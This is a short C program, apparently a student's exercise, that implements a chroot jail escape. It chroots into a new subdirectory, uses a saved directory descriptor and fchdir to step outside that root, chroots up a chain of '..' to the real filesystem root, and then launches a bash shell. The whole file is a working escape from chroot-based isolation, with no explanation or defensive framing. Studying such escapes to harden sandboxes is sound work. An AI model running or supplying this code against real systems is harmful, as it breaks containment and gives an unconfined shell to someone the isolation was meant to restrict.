// author: Hendrik Werner s4549775

#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/stat.h>

#define SUBDIRECTORY "subdirectory"

int main() {
	mkdir(SUBDIRECTORY, 0755);
	int cwd_fd = open(".", O_DIRECTORY);
	chroot(SUBDIRECTORY);
	fchdir(cwd_fd);
	close(cwd_fd);
	chroot("../../../../../../../../../..");
	system("/usr/bin/env bash");
}
